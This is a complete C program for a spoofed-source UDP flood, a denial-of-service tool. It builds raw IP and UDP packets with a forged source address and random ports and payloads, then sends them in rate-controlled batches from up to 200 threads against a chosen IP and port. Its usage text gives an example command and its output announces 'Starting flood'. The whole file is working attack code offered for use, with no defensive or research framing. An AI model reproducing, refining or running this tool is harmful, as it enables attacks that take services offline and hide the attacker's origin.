#define _GNU_SOURCE             // for sendmmsg
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <time.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <errno.h>
#include <stdint.h>
#include <sys/mman.h>           // for madvise if needed

#define MIN_PAYLOAD     800
#define MAX_PAYLOAD     1200
#define BATCH_SIZE      32
#define DEFAULT_PPS     8000          // try to send ~8000 packets/sec per thread (adjust)
#define IP_HDR_LEN      sizeof(struct iphdr)
#define UDP_HDR_LEN     sizeof(struct udphdr)

struct thread_data {
    char *target_ip;
    int   target_port;
    int   duration;
    long  pps;                    // packets per second target per thread
};

struct rng_state {
    uint64_t state;
};

static inline uint64_t fast_rand(struct rng_state *rng) {
    uint64_t x = rng->state;
    x ^= x << 13;
    x ^= x >> 7;
    x ^= x << 17;
    rng->state = x;
    return x;
}

static inline void init_rng(struct rng_state *rng, int thread_id) {
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    rng->state = ts.tv_nsec ^ (ts.tv_sec << 32) ^ ((uint64_t)thread_id << 48);
    if (rng->state == 0) rng->state = 1;
}

static inline uint16_t checksum(const void *buf, size_t len) {
    uint32_t sum = 0;
    const uint16_t *ptr = buf;

    while (len > 1) {
        sum += *ptr++;
        len -= 2;
    }
    if (len) sum += *(uint8_t *)ptr;

    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    return ~sum;
}

static inline void fill_random_data(uint8_t *buf, int len, struct rng_state *rng) {
    uint64_t *p64 = (uint64_t *)buf;
    int i;

    for (i = 0; i < len / 8; i++) {
        p64[i] = fast_rand(rng);
    }

    uint8_t *p8 = (uint8_t *)&p64[i];
    int rem = len % 8;
    for (i = 0; i < rem; i++) {
        p8[i] = (uint8_t)fast_rand(rng);
    }
}

void *attack_thread(void *arg) {
    struct thread_data *data = (struct thread_data *)arg;
    struct rng_state rng;
    int sock;
    struct sockaddr_in dest;
    time_t end_time;
    unsigned long long total_packets = 0;

    init_rng(&rng, (int)pthread_self());

    sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sock < 0) {
        perror("socket(SOCK_RAW)");
        pthread_exit(NULL);
    }

    int one = 1;
    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        perror("setsockopt IP_HDRINCL");
        close(sock);
        pthread_exit(NULL);
    }

    // Increase send buffer (helps sendmmsg)
    int sndbuf = 1024 * 1024 * 4;   // 4 MB
    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));

    memset(&dest, 0, sizeof(dest));
    dest.sin_family      = AF_INET;
    dest.sin_port        = htons(data->target_port);
    dest.sin_addr.s_addr = inet_addr(data->target_ip);

    end_time = time(NULL) + data->duration;

    // Pre-allocate batch buffers
    uint8_t *packets[BATCH_SIZE];
    struct mmsghdr msgs[BATCH_SIZE];
    struct iovec iov[BATCH_SIZE];

    for (int i = 0; i < BATCH_SIZE; i++) {
        packets[i] = malloc(IP_HDR_LEN + UDP_HDR_LEN + MAX_PAYLOAD);
        if (!packets[i]) {
            perror("malloc packet buffer");
            goto cleanup;
        }
    }

    uint64_t packets_goal = 0;
    struct timespec last_wake = {0};
    clock_gettime(CLOCK_MONOTONIC, &last_wake);

    while (time(NULL) <= end_time) {
        // Simple token bucket like rate limit
        struct timespec now;
        clock_gettime(CLOCK_MONOTONIC, &now);
        uint64_t ns_elapsed = (now.tv_sec - last_wake.tv_sec) * 1000000000ULL +
                              (now.tv_nsec - last_wake.tv_nsec);

        uint64_t can_send = (ns_elapsed * data->pps) / 1000000000ULL;
        if (can_send == 0) {
            usleep(200);    // small sleep when throttled
            continue;
        }

        int batch = (can_send < BATCH_SIZE) ? can_send : BATCH_SIZE;
        if (batch == 0) batch = 1;

        for (int i = 0; i < batch; i++) {
            // Random size each time
            int payload_len = MIN_PAYLOAD + (fast_rand(&rng) % (MAX_PAYLOAD - MIN_PAYLOAD + 1));

            // Build IP header
            struct iphdr *iph = (struct iphdr *)packets[i];
            memset(iph, 0, IP_HDR_LEN);

            iph->version  = 4;
            iph->ihl      = 5;
            iph->tot_len  = htons(IP_HDR_LEN + UDP_HDR_LEN + payload_len);
            iph->id       = htons((uint16_t)fast_rand(&rng));
            iph->ttl      = 64;
            iph->protocol = IPPROTO_UDP;
            iph->saddr    = inet_addr("192.168.1.100");          // SPOOFED – change or randomize
            iph->daddr    = dest.sin_addr.s_addr;

            iph->check = 0;
            iph->check = checksum(iph, IP_HDR_LEN);

            // UDP header
            struct udphdr *udph = (struct udphdr *)(packets[i] + IP_HDR_LEN);
            udph->source = htons(1024 + (fast_rand(&rng) % 64511));  // random source port
            udph->dest   = htons(data->target_port);
            udph->len    = htons(UDP_HDR_LEN + payload_len);
            udph->check  = 0;   // optional – many firewalls accept 0

            // Payload
            uint8_t *payload = packets[i] + IP_HDR_LEN + UDP_HDR_LEN;
            fill_random_data(payload, payload_len, &rng);

            // Prepare iovec
            iov[i].iov_base = packets[i];
            iov[i].iov_len  = IP_HDR_LEN + UDP_HDR_LEN + payload_len;

            // Prepare msghdr
            memset(&msgs[i], 0, sizeof(msgs[i]));
            msgs[i].msg_hdr.msg_name    = &dest;
            msgs[i].msg_hdr.msg_namelen = sizeof(dest);
            msgs[i].msg_hdr.msg_iov     = &iov[i];
            msgs[i].msg_hdr.msg_iovlen  = 1;
        }

        // Send batch
        int r = sendmmsg(sock, msgs, batch, 0);
        if (r < 0) {
            if (errno != EAGAIN && errno != ENOBUFS && errno != EINTR) {
                perror("sendmmsg");
                if (total_packets == 0) break;
            }
        } else {
            total_packets += r;
        }

        packets_goal += batch;
        last_wake = now;
    }

    printf("Thread %lu finished: %llu packets sent (~%.1f pps)\n",
           pthread_self(), total_packets,
           (double)total_packets / data->duration);

cleanup:
    for (int i = 0; i < BATCH_SIZE; i++) {
        free(packets[i]);
    }
    close(sock);
    pthread_exit(NULL);
}

void usage(const char *prog) {
    printf("Usage: %s <target_ip> <port> <seconds> <threads> [pps_per_thread]\n", prog);
    printf("  Example: sudo %s 192.168.1.55 80 30 8 12000\n", prog);
    printf("  Note: requires root (raw sockets)\n");
    exit(1);
}

int main(int argc, char *argv[]) {
    if (argc < 5 || argc > 6) {
        usage(argv[0]);
    }

    char *target_ip   = argv[1];
    int   target_port = atoi(argv[2]);
    int   duration    = atoi(argv[3]);
    int   num_threads = atoi(argv[4]);
    long  pps         = (argc == 6) ? atol(argv[5]) : DEFAULT_PPS;

    if (target_port < 1 || target_port > 65535) {
        fprintf(stderr, "Invalid port\n");
        exit(1);
    }
    if (duration < 1 || duration > 86400) {
        fprintf(stderr, "Duration 1–86400 s\n");
        exit(1);
    }
    if (num_threads < 1 || num_threads > 200) {
        fprintf(stderr, "Threads 1–200\n");
        exit(1);
    }

    struct in_addr addr;
    if (inet_aton(target_ip, &addr) == 0) {
        fprintf(stderr, "Invalid IP\n");
        exit(1);
    }

    struct thread_data data = {
        .target_ip   = target_ip,
        .target_port = target_port,
        .duration    = duration,
        .pps         = pps
    };

    pthread_t *threads = malloc(num_threads * sizeof(pthread_t));
    if (!threads) {
        perror("malloc threads");
        exit(1);
    }

    printf("Starting flood → %s:%d  (%d s, %d threads, ~%ld pps/thread)\n",
           target_ip, target_port, duration, num_threads, pps);

    for (int i = 0; i < num_threads; i++) {
        if (pthread_create(&threads[i], NULL, attack_thread, &data) != 0) {
            perror("pthread_create");
            exit(1);
        }
        usleep(1000);   // tiny stagger
    }

    for (int i = 0; i < num_threads; i++) {
        pthread_join(threads[i], NULL);
    }

    free(threads);
    printf("All threads finished.\n");

    return 0;
}
